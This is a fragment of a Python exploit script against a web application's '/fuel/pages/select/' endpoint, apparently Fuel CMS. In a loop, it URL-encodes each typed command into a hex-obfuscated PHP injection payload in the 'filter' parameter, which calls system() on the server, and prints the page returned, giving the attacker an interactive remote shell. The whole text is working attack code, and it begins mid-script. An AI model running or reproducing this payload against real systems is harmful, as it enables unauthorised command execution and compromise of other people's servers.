while True:
 cmd = input(Style.BRIGHT+Fore.YELLOW+"Enter Command $"+Style.RESET_ALL)
  
 main_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+quote(cmd)+"%27%29%2b%27"

 r = requests.get(main_url)

 #<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

 output = r.text.split('<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">')
 print(output[0])
 if cmd == "exit":
  break